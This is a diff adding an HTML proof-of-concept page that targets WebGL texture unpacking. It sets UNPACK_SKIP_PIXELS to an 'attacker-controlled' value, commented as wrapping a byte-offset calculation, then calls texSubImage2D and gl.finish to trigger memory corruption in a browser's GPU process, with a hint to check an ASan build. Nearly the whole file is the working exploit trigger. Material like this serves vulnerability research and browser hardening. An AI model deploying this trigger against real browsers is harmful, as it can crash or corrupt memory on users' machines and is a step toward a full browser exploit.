@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>WebGL UNPACK_SKIP_PIXELS PoC</title>
+<style>
+  body { background:#111; color:#0f0; font-family: monospace; }
+  canvas { border:1px solid #444; }
+</style>
+</head>
+<body>
+
+<h3>WebGL UNPACK_SKIP_PIXELS PoC</h3>
+<p id="log">initializing…</p>
+<canvas id="c" width="4" height="4"></canvas>
+
+<script>
+(function () {
+  const log = (m) => document.getElementById("log").textContent = m;
+
+  const canvas = document.getElementById("c");
+  const gl = canvas.getContext("webgl2") || canvas.getContext("webgl");
+
+  if (!gl) {
+    log("WebGL not supported");
+    return;
+  }
+
+  log("WebGL context OK");
+
+  // create texture
+  const tex = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D, tex);
+  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+
+  // allocate small texture
+  gl.texImage2D(
+    gl.TEXTURE_2D,
+    0,
+    gl.RGBA,
+    1,
+    1,
+    0,
+    gl.RGBA,
+    gl.UNSIGNED_BYTE,
+    null
+  );
+
+  // attacker-controlled values
+  const BYTES_PER_PIXEL = 4;
+  const EVIL_SKIP = 0x3FFFFFFF; // causes wrap in skipBytes * bpp
+
+  gl.pixelStorei(gl.UNPACK_ALIGNMENT, 1);
+  gl.pixelStorei(gl.UNPACK_ROW_LENGTH, 1);
+  gl.pixelStorei(gl.UNPACK_SKIP_ROWS, 0);
+  gl.pixelStorei(gl.UNPACK_SKIP_PIXELS, EVIL_SKIP);
+
+  // minimal buffer
+  const data = new Uint8Array([255, 0, 0, 255]);
+
+  try {
+    gl.texSubImage2D(
+      gl.TEXTURE_2D,
+      0,
+      0,
+      0,
+      1,
+      1,
+      gl.RGBA,
+      gl.UNSIGNED_BYTE,
+      data
+    );
+    log("texSubImage2D executed (check GPU process / ASan build)");
+  } catch (e) {
+    log("Exception: " + e);
+  }
+
+  // force GPU work
+  gl.finish();
+})();
+</script>
+
+</body>
+</html>
